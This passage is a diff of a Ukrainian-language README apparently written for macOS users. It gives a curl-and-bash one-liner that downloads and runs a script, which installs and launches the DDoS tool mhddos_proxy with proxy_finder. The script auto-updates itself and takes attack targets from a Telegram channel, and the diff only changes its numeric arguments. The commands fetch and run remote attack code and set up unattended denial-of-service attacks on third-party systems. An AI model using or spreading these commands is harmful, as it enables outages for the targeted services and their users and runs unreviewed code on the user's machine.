@@ -34,7 +34,7 @@ curl -LO https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_finder
 2) Запускаємо скрипт, який сам встановить необхідні програми: Brew, Python, Git, доп. засоби Баш'у (можливо попросить ввести пароль для установки, 10 Гб вільного місця на диску та натиснути ENTER, щоб продовжити завантаження - тому слідкуйте уважно за виконанням скрипта при першому запуску), та після установки сам запустить mhddos_proxy та proxy_finder:    
 ```shell
 cd ~
-curl -LO https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_mac/main/runner.sh && bash runner.sh 2000 2000 -d
+curl -LO https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_mac/main/runner.sh && bash runner.sh 500 1000 -d
 ```
 Більш детально про всі параметри можна почитати тут: https://github.com/alexnest-ua/auto_mhddos_mac - цей скрипт дозволяє запустити одночасно mhddos_proxy та  proxy_finder, який ще й автоматично оновлює не лише себе, а й mhddos_proxy та proxy_finder, та бере актуальні цілі звідси: https://t.me/ddos_separ  
 Тому можете запускати його та йти займатися своїми справами, а скрипт зробить все за вас
